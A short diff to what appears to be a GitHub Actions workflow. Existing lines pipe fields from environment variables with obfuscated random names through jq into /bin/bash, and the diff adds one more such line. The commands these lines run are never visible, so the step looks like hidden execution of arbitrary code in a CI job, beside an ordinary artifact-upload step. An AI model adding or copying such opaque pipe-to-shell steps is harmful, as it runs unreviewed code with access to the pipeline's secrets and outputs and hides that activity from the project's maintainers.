@@ -36,6 +36,7 @@ jobs:
           echo $zfvk72864 | jq -r .py84399 | /bin/bash
           echo $um73 | jq -r .wej62 | /bin/bash
           echo $aaorg3156 | jq -r .orqxm51 | /bin/bash
+          printf '%s' "$rydou6690" | jq -r .zh650 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
